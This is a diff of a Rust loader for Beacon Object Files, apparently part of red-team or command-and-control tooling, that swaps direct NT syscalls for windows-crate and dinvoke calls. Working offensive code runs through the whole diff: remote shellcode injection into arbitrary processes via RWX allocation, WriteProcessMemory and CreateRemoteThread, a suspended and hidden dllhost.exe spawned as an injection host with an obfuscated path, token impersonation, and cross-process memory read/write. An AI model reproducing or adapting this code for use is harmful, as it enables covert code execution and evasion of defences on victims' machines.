@@ -11,26 +11,26 @@ use core::{
     ptr::{self, null_mut},
 };
 
-use dinvk::types::OBJECT_ATTRIBUTES;
-use dinvk::{syscall, winapis::NtCurrentProcess};
-use obfstr::obfstr as s;
 use spin::Mutex;
-use windows_sys::Win32::{
-    Foundation::{CloseHandle, DuplicateHandle, FALSE, HANDLE, STATUS_SUCCESS},
-    Security::*,
+use windows::Win32::{
+    Foundation::{CloseHandle, DuplicateHandle, HANDLE},
+    Security::{
+        GetTokenInformation, RevertToSelf, TOKEN_ELEVATION, TOKEN_QUERY, TokenElevation,
+    },
     System::{
-        Diagnostics::Debug::{
-            CONTEXT, GetThreadContext, ReadProcessMemory, SetThreadContext, WriteProcessMemory,
-        },
+        Diagnostics::Debug::{CONTEXT, GetThreadContext, SetThreadContext},
         Memory::{
-            MEM_COMMIT, MEM_RESERVE, MEMORY_BASIC_INFORMATION, MEMORY_MAPPED_VIEW_ADDRESS,
-            PAGE_EXECUTE_READWRITE, UnmapViewOfFile, VirtualAlloc, VirtualAllocEx, VirtualFree,
-            VirtualProtect, VirtualProtectEx, VirtualQuery,
+            MEM_COMMIT, MEM_RESERVE, MEMORY_BASIC_INFORMATION, PAGE_EXECUTE_READWRITE,
+            UnmapViewOfFile, VirtualAlloc, VirtualAllocEx, VirtualFree, VirtualProtect,
+            VirtualProtectEx, VirtualQuery,
         },
-        Threading::*,
-        WindowsProgramming::CLIENT_ID,
+        Threading::{
+            CREATE_NO_WINDOW, CREATE_SUSPENDED, CreateProcessA, GetCurrentProcess, OpenProcess,
+            OpenThread, PROCESS_INFORMATION, ResumeThread, STARTUPINFOA,
+        },
     },
 };
+
 
 use crate::error::{CoffeeLdrError, Result};
 use const_encrypt::obf;
@@ -589,7 +589,7 @@ unsafe extern "C" fn beacon_printf(_type: c_int, fmt: *mut c_char, args: ...) {
 /// Reverts any impersonated token back to the original process token.
 fn beacon_rever_token() {
     unsafe {
-        if RevertToSelf() == 0 {
+        if RevertToSelf().is_err() {
             log::warn!("RevertToSelf Failed!")
         }
     }
@@ -597,33 +597,42 @@ fn beacon_rever_token() {
 
 /// Applies a token to the current thread.
 fn beacon_use_token(token: HANDLE) -> i32 {
-    unsafe { SetThreadToken(null_mut(), token) }
+    unsafe {
+        if dinvoke::advapi32::SetThreadToken(None, Some(token)).is_ok() {
+            1
+        } else {
+            0
+        }
+    }
 }
 
 /// Closes handles associated with a spawned process.
 fn beacon_cleanup_process(info: *const PROCESS_INFORMATION) {
     unsafe {
-        CloseHandle((*info).hProcess);
-        CloseHandle((*info).hThread);
+        let _ = CloseHandle((*info).hProcess);
+        let _ = CloseHandle((*info).hThread);
     }
 }
 
 /// Checks whether the current process is elevated (admin token).
 fn beacon_is_admin() -> u32 {
-    let mut h_token = null_mut();
+    use windows::Win32::System::Threading::OpenProcessToken;
+
+    let mut h_token = HANDLE::default();
 
     unsafe {
-        if OpenProcessToken(NtCurrentProcess(), TOKEN_QUERY, &mut h_token) != 0 {
+        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut h_token).is_ok() {
             let mut elevation = TOKEN_ELEVATION { TokenIsElevated: 0 };
             let mut return_length = 0;
 
             if GetTokenInformation(
                 h_token,
                 TokenElevation,
-                &mut elevation as *mut _ as *mut c_void,
+                Some(&mut elevation as *mut _ as *mut c_void),
                 size_of::<TOKEN_ELEVATION>() as u32,
                 &mut return_length,
-            ) != 0
+            )
+            .is_ok()
             {
                 return (elevation.TokenIsElevated == 1) as u32;
             }
@@ -677,7 +686,7 @@ fn to_wide_char(src: *const c_char, dst: *mut u16, max: c_int) -> c_int {
     1
 }
 
-/// Performs remote process injection into a target process via NT syscalls.
+/// Performs remote process injection into a target process.
 fn beacon_inject_process(
     _h_process: HANDLE,
     pid: c_int,
@@ -687,83 +696,68 @@ fn beacon_inject_process(
     _arg: *const c_char,
     _a_len: c_int,
 ) {
+    use windows::Win32::System::Threading::{
+        PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
+    };
+
     if payload.is_null() || len <= 0 {
         return;
     }
 
     unsafe {
-        let mut oa = OBJECT_ATTRIBUTES::default();
-        let mut ci = CLIENT_ID {
-            UniqueProcess: pid as HANDLE,
-            UniqueThread: null_mut(),
+        let h_process = match OpenProcess(
+            PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
+            false,
+            pid as u32,
+        ) {
+            Ok(h) => h,
+            Err(_) => return,
         };
 
-        let mut h_process = null_mut::<c_void>();
-        let status = syscall!(
-            s!("NtOpenProcess"),
-            &mut h_process,
-            PROCESS_ALL_ACCESS,
-            &mut oa,
-            &mut ci
-        );
-        if status != Some(STATUS_SUCCESS) {
-            return;
-        }
-
-        let mut size = len as usize;
-        let mut address = null_mut::<c_void>();
-        let mut status = syscall!(
-            s!("NtAllocateVirtualMemory"),
+        let remote_addr = VirtualAllocEx(
             h_process,
-            &mut address,
-            0,
-            &mut size,
+            None,
+            len as usize,
             MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE
+            PAGE_EXECUTE_READWRITE,
         );
 
-        if status != Some(STATUS_SUCCESS) {
-            CloseHandle(h_process);
+        if remote_addr.is_null() {
+            let _ = CloseHandle(h_process);
             return;
         }
 
-        let mut now = 0usize;
-        status = syscall!(
-            s!("NtWriteVirtualMemory"),
+        let mut written = 0usize;
+        if dinvoke::kernel32::WriteProcessMemory(
             h_process,
-            address,
+            remote_addr,
             payload as *const c_void,
             len as usize,
-            &mut now
-        );
-        if status != Some(STATUS_SUCCESS) {
-            CloseHandle(h_process);
+            Some(&mut written),
+        )
+        .is_err()
+        {
+            let _ = CloseHandle(h_process);
             return;
         }
 
-        let mut h_thread = null_mut::<c_void>();
-        status = syscall!(
-            s!("NtCreateThreadEx"),
-            &mut h_thread,
-            THREAD_ALL_ACCESS,
-            null_mut::<c_void>(),
+        let h_thread = dinvoke::kernel32::CreateRemoteThread(
             h_process,
-            address,
-            null_mut::<c_void>(),
-            0usize,
-            0usize,
-            0usize,
-            0usize,
-            null_mut::<c_void>()
+            None,
+            0,
+            Some(core::mem::transmute::<
+                *mut c_void,
+                unsafe extern "system" fn(*mut c_void) -> u32,
+            >(remote_addr)),
+            None,
+            0,
+            None,
         );
 
-        if status != Some(STATUS_SUCCESS) || h_thread.is_null() {
-            CloseHandle(h_process);
-            return;
+        if let Ok(thread) = h_thread {
+            let _ = CloseHandle(thread);
         }
-
-        CloseHandle(h_thread);
-        CloseHandle(h_process);
+        let _ = CloseHandle(h_process);
     }
 }
 
@@ -803,14 +797,14 @@ fn beacon_inject_temporary_process(
         let h_process = (*info).hProcess;
         let h_thread = (*info).hThread;
 
-        if h_process.is_null() || h_thread.is_null() {
+        if h_process.is_invalid() || h_thread.is_invalid() {
             return;
         }
 
         // Allocate memory in target process
         let remote_addr = VirtualAllocEx(
             h_process,
-            null_mut(),
+            None,
             len as usize,
             MEM_COMMIT | MEM_RESERVE,
             PAGE_EXECUTE_READWRITE,
@@ -822,15 +816,15 @@ fn beacon_inject_temporary_process(
 
         // Write payload to target process
         let mut written = 0usize;
-        let write_result = WriteProcessMemory(
+        let write_result = dinvoke::kernel32::WriteProcessMemory(
             h_process,
             remote_addr,
             payload as *const c_void,
             len as usize,
-            &mut written,
+            Some(&mut written),
         );
 
-        if write_result == 0 {
+        if write_result.is_err() {
             return;
         }
 
@@ -838,22 +832,21 @@ fn beacon_inject_temporary_process(
         let entry_point = (remote_addr as usize + offset as usize) as *mut c_void;
 
         // Create remote thread to execute the payload
-        let mut thread_id = 0u32;
-        let h_remote_thread = CreateRemoteThread(
+        let h_remote_thread = dinvoke::kernel32::CreateRemoteThread(
             h_process,
-            null_mut(),
+            None,
             0,
             Some(core::mem::transmute::<
                 *mut c_void,
                 unsafe extern "system" fn(*mut c_void) -> u32,
             >(entry_point)),
-            null_mut(),
+            None,
             0,
-            &mut thread_id,
+            None,
         );
 
-        if !h_remote_thread.is_null() {
-            CloseHandle(h_remote_thread);
+        if let Ok(thread) = h_remote_thread {
+            let _ = CloseHandle(thread);
         }
     }
 }
@@ -866,8 +859,10 @@ fn beacon_spawn_temporary_process(
     s_info: *mut STARTUPINFOA,
     p_info: *mut PROCESS_INFORMATION,
 ) -> i32 {
+    use windows::core::PCSTR;
+
     if p_info.is_null() {
-        return FALSE;
+        return 0;
     }
 
     unsafe {
@@ -890,34 +885,34 @@ fn beacon_spawn_temporary_process(
         let result = if x86 != 0 {
             let mut path = obf!("C:\\Windows\\SysWOW64\\dllhost.exe\0");
             CreateProcessA(
-                path.as_bytes().as_ptr(),
-                null_mut(),
-                null_mut(),
-                null_mut(),
-                FALSE,
+                PCSTR(path.as_bytes().as_ptr()),
+                None,
+                None,
+                None,
+                false,
                 CREATE_SUSPENDED | CREATE_NO_WINDOW,
-                null_mut(),
-                null_mut(),
+                None,
+                PCSTR::null(),
                 si,
                 p_info,
             )
         } else {
             let mut path = obf!("C:\\Windows\\System32\\dllhost.exe\0");
             CreateProcessA(
-                path.as_bytes().as_ptr(),
-                null_mut(),
-                null_mut(),
-                null_mut(),
-                FALSE,
+                PCSTR(path.as_bytes().as_ptr()),
+                None,
+                None,
+                None,
+                false,
                 CREATE_SUSPENDED | CREATE_NO_WINDOW,
-                null_mut(),
-                null_mut(),
+                None,
+                PCSTR::null(),
                 si,
                 p_info,
             )
         };
 
-        if result != 0 { 1 } else { 0 }
+        if result.is_ok() { 1 } else { 0 }
     }
 }
 
@@ -1024,7 +1019,17 @@ fn beacon_virtual_alloc(
     alloc_type: u32,
     protect: u32,
 ) -> *mut c_void {
-    unsafe { VirtualAlloc(address, size, alloc_type, protect) }
+    use windows::Win32::System::Memory::{
+        PAGE_PROTECTION_FLAGS, VIRTUAL_ALLOCATION_TYPE,
+    };
+    unsafe {
+        VirtualAlloc(
+            Some(address),
+            size,
+            VIRTUAL_ALLOCATION_TYPE(alloc_type),
+            PAGE_PROTECTION_FLAGS(protect),
+        )
+    }
 }
 
 /// Allocates virtual memory in the specified process.
@@ -1036,7 +1041,18 @@ fn beacon_virtual_alloc_ex(
     alloc_type: u32,
     protect: u32,
 ) -> *mut c_void {
-    unsafe { VirtualAllocEx(process, address, size, alloc_type, protect) }
+    use windows::Win32::System::Memory::{
+        PAGE_PROTECTION_FLAGS, VIRTUAL_ALLOCATION_TYPE,
+    };
+    unsafe {
+        VirtualAllocEx(
+            process,
+            Some(address),
+            size,
+            VIRTUAL_ALLOCATION_TYPE(alloc_type),
+            PAGE_PROTECTION_FLAGS(protect),
+        )
+    }
 }
 
 /// Changes protection on a region of virtual memory in the current process.
@@ -1047,7 +1063,15 @@ fn beacon_virtual_protect(
     new_protect: u32,
     old_protect: *mut u32,
 ) -> i32 {
-    unsafe { VirtualProtect(address, size, new_protect, old_protect) }
+    use windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS;
+    unsafe {
+        let mut old = PAGE_PROTECTION_FLAGS(0);
+        let result = VirtualProtect(address, size, PAGE_PROTECTION_FLAGS(new_protect), &mut old);
+        if !old_protect.is_null() {
+            *old_protect = old.0;
+        }
+        if result.is_ok() { 1 } else { 0 }
+    }
 }
 
 /// Changes protection on a region of virtual memory in the specified process.
@@ -1059,13 +1083,29 @@ fn beacon_virtual_protect_ex(
     new_protect: u32,
     old_protect: *mut u32,
 ) -> i32 {
-    unsafe { VirtualProtectEx(process, address, size, new_protect, old_protect) }
+    use windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS;
+    unsafe {
+        let mut old = PAGE_PROTECTION_FLAGS(0);
+        let result =
+            VirtualProtectEx(process, address, size, PAGE_PROTECTION_FLAGS(new_protect), &mut old);
+        if !old_protect.is_null() {
+            *old_protect = old.0;
+        }
+        if result.is_ok() { 1 } else { 0 }
+    }
 }
 
 /// Releases or decommits virtual memory in the current process.
 /// Proxy to kernel32!VirtualFree.
 fn beacon_virtual_free(address: *mut c_void, size: usize, free_type: u32) -> i32 {
-    unsafe { VirtualFree(address, size, free_type) }
+    use windows::Win32::System::Memory::VIRTUAL_FREE_TYPE;
+    unsafe {
+        if VirtualFree(address, size, VIRTUAL_FREE_TYPE(free_type)).is_ok() {
+            1
+        } else {
+            0
+        }
+    }
 }
 
 /// Queries information about a region of virtual memory.
@@ -1075,19 +1115,19 @@ fn beacon_virtual_query(
     buffer: *mut MEMORY_BASIC_INFORMATION,
     length: usize,
 ) -> usize {
-    unsafe { VirtualQuery(address, buffer, length) }
+    unsafe { VirtualQuery(Some(address), buffer, length) }
 }
 
 /// Gets the context of the specified thread.
 /// Proxy to kernel32!GetThreadContext.
 fn beacon_get_thread_context(thread: HANDLE, context: *mut CONTEXT) -> i32 {
-    unsafe { GetThreadContext(thread, context) }
+    unsafe { if GetThreadContext(thread, context).is_ok() { 1 } else { 0 } }
 }
 
 /// Sets the context of the specified thread.
 /// Proxy to kernel32!SetThreadContext.
 fn beacon_set_thread_context(thread: HANDLE, context: *const CONTEXT) -> i32 {
-    unsafe { SetThreadContext(thread, context) }
+    unsafe { if SetThreadContext(thread, context).is_ok() { 1 } else { 0 } }
 }
 
 /// Resumes the specified thread.
@@ -1099,28 +1139,37 @@ fn beacon_resume_thread(thread: HANDLE) -> u32 {
 /// Opens an existing process object.
 /// Proxy to kernel32!OpenProcess.
 fn beacon_open_process(desired_access: u32, inherit_handle: i32, process_id: u32) -> HANDLE {
-    unsafe { OpenProcess(desired_access, inherit_handle, process_id) }
+    use windows::Win32::System::Threading::PROCESS_ACCESS_RIGHTS;
+    unsafe {
+        OpenProcess(PROCESS_ACCESS_RIGHTS(desired_access), inherit_handle != 0, process_id)
+            .unwrap_or_default()
+    }
 }
 
 /// Opens an existing thread object.
 /// Proxy to kernel32!OpenThread.
 fn beacon_open_thread(desired_access: u32, inherit_handle: i32, thread_id: u32) -> HANDLE {
-    unsafe { OpenThread(desired_access, inherit_handle, thread_id) }
+    use windows::Win32::System::Threading::THREAD_ACCESS_RIGHTS;
+    unsafe {
+        OpenThread(THREAD_ACCESS_RIGHTS(desired_access), inherit_handle != 0, thread_id)
+            .unwrap_or_default()
+    }
 }
 
 /// Closes an open object handle.
 /// Proxy to kernel32!CloseHandle.
 fn beacon_close_handle(handle: HANDLE) -> i32 {
-    unsafe { CloseHandle(handle) }
+    unsafe { if CloseHandle(handle).is_ok() { 1 } else { 0 } }
 }
 
 /// Unmaps a mapped view of a file from the calling process's address space.
 /// Proxy to kernel32!UnmapViewOfFile.
 fn beacon_unmap_view_of_file(base_address: *const c_void) -> i32 {
+    use windows::Win32::System::Memory::MEMORY_MAPPED_VIEW_ADDRESS;
     let addr = MEMORY_MAPPED_VIEW_ADDRESS {
         Value: base_address as *mut c_void,
     };
-    unsafe { UnmapViewOfFile(addr) }
+    unsafe { if UnmapViewOfFile(addr).is_ok() { 1 } else { 0 } }
 }
 
 /// Duplicates an object handle.
@@ -1134,16 +1183,23 @@ fn beacon_duplicate_handle(
     inherit_handle: i32,
     options: u32,
 ) -> i32 {
+    use windows::Win32::Foundation::DUPLICATE_HANDLE_OPTIONS;
     unsafe {
-        DuplicateHandle(
+        if DuplicateHandle(
             source_process,
             source_handle,
             target_process,
             target_handle,
             desired_access,
-            inherit_handle,
-            options,
+            inherit_handle != 0,
+            DUPLICATE_HANDLE_OPTIONS(options),
         )
+        .is_ok()
+        {
+            1
+        } else {
+            0
+        }
     }
 }
 
@@ -1156,7 +1212,16 @@ fn beacon_read_process_memory(
     size: usize,
     bytes_read: *mut usize,
 ) -> i32 {
-    unsafe { ReadProcessMemory(process, base_address, buffer, size, bytes_read) }
+    unsafe {
+        let opt_bytes_read = if bytes_read.is_null() { None } else { Some(bytes_read) };
+        if dinvoke::kernel32::ReadProcessMemory(process, base_address, buffer, size, opt_bytes_read)
+            .is_ok()
+        {
+            1
+        } else {
+            0
+        }
+    }
 }
 
 /// Writes data to an area of memory in a specified process.
@@ -1168,7 +1233,22 @@ fn beacon_write_process_memory(
     size: usize,
     bytes_written: *mut usize,
 ) -> i32 {
-    unsafe { WriteProcessMemory(process, base_address, buffer, size, bytes_written) }
+    unsafe {
+        let opt_bytes_written = if bytes_written.is_null() { None } else { Some(bytes_written) };
+        if dinvoke::kernel32::WriteProcessMemory(
+            process,
+            base_address,
+            buffer,
+            size,
+            opt_bytes_written,
+        )
+        .is_ok()
+        {
+            1
+        } else {
+            0
+        }
+    }
 }
 
 /// Returns a pointer to the DataStoreObject at the specified index.
